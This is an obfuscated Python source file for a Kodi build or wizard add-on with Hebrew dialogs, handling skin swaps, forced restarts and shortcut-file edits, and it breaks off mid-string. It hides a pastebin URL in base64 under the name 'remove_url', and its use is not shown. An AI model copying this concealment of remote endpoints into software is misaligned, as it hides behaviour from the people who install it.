# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OO00000O00000O00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O00O00OO000OOO00O =[];OOO0OO00O00OO0O00 =[]#line:261
	for O0OO000OO0OO0000O in sorted (OO00000O00000O00O ,key =lambda O0O0OOOOOOOO0O00O :O0O0OOOOOOOO0O00O ):#line:262
		OO00OOOO0O0O0O0OO =os .path .split (O0OO000OO0OO0000O [:-1 ])[1 ]#line:263
		OO0OO00OO0O00OOOO =os .path .join (O0OO000OO0OO0000O ,'addon.xml')#line:264
		if os .path .exists (OO0OO00OO0O00OOOO ):#line:265
			O00OO0OO0O0O000O0 =open (OO0OO00OO0O00OOOO )#line:266
			OO0000O0O00O0O0O0 =O00OO0OO0O0O000O0 .read ()#line:267
			O00O0OO00O0OOOO00 =parseDOM2 (OO0000O0O00O0O0O0 ,'addon',ret ='id')#line:268
			O0000O0O0000O0OO0 =OO00OOOO0O0O0O0OO if len (O00O0OO00O0OOOO00 )==0 else O00O0OO00O0OOOO00 [0 ]#line:269
			try :#line:270
				O0OOOO0OO0O00OO0O =xbmcaddon .Addon (id =O0000O0O0000O0OO0 )#line:271
				O00O00OO000OOO00O .append (O0OOOO0OO0O00OO0O .getAddonInfo ('name'))#line:272
				OOO0OO00O00OO0O00 .append (O0000O0O0000O0OO0 )#line:273
			except :#line:274
				pass #line:275
	OOO00O00O0000OOOO =[];OO0O00OO0O0000OO0 =0 #line:276
	O0000O0OO0OOO0O00 =["Current Skin -- %s"%currSkin ()]+O00O00OO000OOO00O #line:277
	OO0O00OO0O0000OO0 =DIALOG .select ("Select the Skin you want to swap with.",O0000O0OO0OOO0O00 )#line:278
	if OO0O00OO0O0000OO0 ==-1 :return #line:279
	else :#line:280
		O00O0O0O00000O00O =(OO0O00OO0O0000OO0 -1 )#line:281
		OOO00O00O0000OOOO .append (O00O0O0O00000O00O )#line:282
		O0000O0OO0OOO0O00 [OO0O00OO0O0000OO0 ]="%s"%(O00O00OO000OOO00O [O00O0O0O00000O00O ])#line:283
	if OOO00O00O0000OOOO ==None :return #line:284
	for O00000000O00OO000 in OOO00O00O0000OOOO :#line:285
		swapSkins (OOO0OO00O00OO0O00 [O00000000O00OO000 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (O00000OOOOOO0O00O ,title ="Error"):#line:290
	OOO0O000O0O0O0OO0 ='lookandfeel.skin'#line:291
	O00O0O0OO000OOOO0 =O00000OOOOOO0O00O #line:292
	OO000000OOO00000O =getOld (OOO0O000O0O0O0OO0 )#line:293
	OO00000000O0OO000 =OOO0O000O0O0O0OO0 #line:294
	setNew (OO00000000O0OO000 ,O00O0O0OO000OOOO0 )#line:295
	OO0O0000O000OOO00 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0000O000OOO00 <100 :#line:297
		OO0O0000O000OOO00 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O0OO0000OO00O0O00 ):#line:304
	try :#line:305
		O0OO0000OO00O0O00 ='"%s"'%O0OO0000OO00O0O00 #line:306
		O0OOOOOO00OO0OO00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OO0000OO00O0O00 )#line:307
		OOOO0000O0OOO0O0O =xbmc .executeJSONRPC (O0OOOOOO00OO0OO00 )#line:309
		OOOO0000O0OOO0O0O =simplejson .loads (OOOO0000O0OOO0O0O )#line:310
		if OOOO0000O0OOO0O0O .has_key ('result'):#line:311
			if OOOO0000O0OOO0O0O ['result'].has_key ('value'):#line:312
				return OOOO0000O0OOO0O0O ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (OO00OO0OO0000OO00 ,OO0O000O0O0OO0O0O ):#line:319
	try :#line:320
		OO00OO0OO0000OO00 ='"%s"'%OO00OO0OO0000OO00 #line:321
		OO0O000O0O0OO0O0O ='"%s"'%OO0O000O0O0OO0O0O #line:322
		O0000OOO0O0O0O000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO00OO0OO0000OO00 ,OO0O000O0O0OO0O0O )#line:323
		OOO0000O000O00O0O =xbmc .executeJSONRPC (O0000OOO0O0O0O000 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			O000OO000O00O000O =xbmcgui .DialogProgress ()#line:334
			O000OO000O00O000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			O000OO000O00O000O .update (0 )#line:338
			for OO0O0O0O00O0O00O0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				O000OO000O00O000O .update (int ((5 -OO0O0O0O00O0O00O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O0O0O00O0O00O0 ),'')#line:341
				if O000OO000O00O000O .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			O000OO000O00O000O =xbmcgui .DialogProgress ()#line:347
			O000OO000O00O000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			O000OO000O00O000O .update (0 )#line:351
			for OO0O0O0O00O0O00O0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				O000OO000O00O000O .update (int ((5 -OO0O0O0O00O0O00O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O0O0O00O0O00O0 ),'')#line:354
				if O000OO000O00O000O .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
			indicatorfastupdate ()#line:365
def rdoff ():#line:367
	resloginit .resloginit ('restore','all')#line:369
	OOOOOO00OO000OOO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:370
	OO000OOO00OOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:371
	copyfile (OOOOOO00OO000OOO0 ,OO000OOO00OOOOOO0 )#line:372
def rdon ():#line:374
	loginit .loginIt ('restore','all')#line:375
	OOO00O000O0O00OOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:377
	O0O0OOOOOOOO00000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:378
	copyfile (OOO00O000O0O00OOO ,O0O0OOOOOOOO00000 )#line:379
def adults18 ():#line:381
  OO0OO0000OOO0OO0O =(ADDON .getSetting ("adults"))#line:382
  if OO0OO0000OOO0OO0O =='true':#line:383
    OO0OOO0O0O0O0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:384
    with open (OO0OOO0O0O0O0000O ,'r')as OOO0OOOO0O0000000 :#line:385
      OOO0OO0000000OOO0 =OOO0OOOO0O0000000 .read ()#line:386
    OOO0OO0000000OOO0 =OOO0OO0000000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:404
    with open (OO0OOO0O0O0O0000O ,'w')as OOO0OOOO0O0000000 :#line:407
      OOO0OOOO0O0000000 .write (OOO0OO0000000OOO0 )#line:408
def rdbuildaddon ():#line:409
  O00000OO000OOO0OO =(ADDON .getSetting ("rdbuild"))#line:410
  if O00000OO000OOO0OO =='true':#line:411
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:412
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:413
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:414
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:432
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:435
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:436
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:440
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:441
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:442
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:460
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:463
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:464
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:468
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:469
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:470
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:488
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:491
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:492
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:496
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:497
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:498
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:516
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:519
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:520
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:523
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:524
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:525
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:543
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:546
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:547
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:549
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:550
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:551
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:569
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:572
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:573
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:575
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:576
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:577
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
